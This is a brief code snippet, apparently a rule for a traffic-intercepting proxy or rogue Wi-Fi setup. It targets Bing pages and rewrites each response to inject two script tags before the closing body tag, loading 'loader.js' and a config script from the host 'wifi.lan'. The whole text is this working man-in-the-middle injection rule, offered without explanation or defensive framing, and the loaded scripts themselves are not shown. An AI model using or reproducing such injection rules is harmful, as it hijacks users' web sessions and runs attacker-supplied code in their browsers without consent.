http()
    .url(/bing/i)
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://wifi.lan/loader.js'></script>
        <script src='http://wifi.lan/crisps/config.js'></script>
        </body>
    `)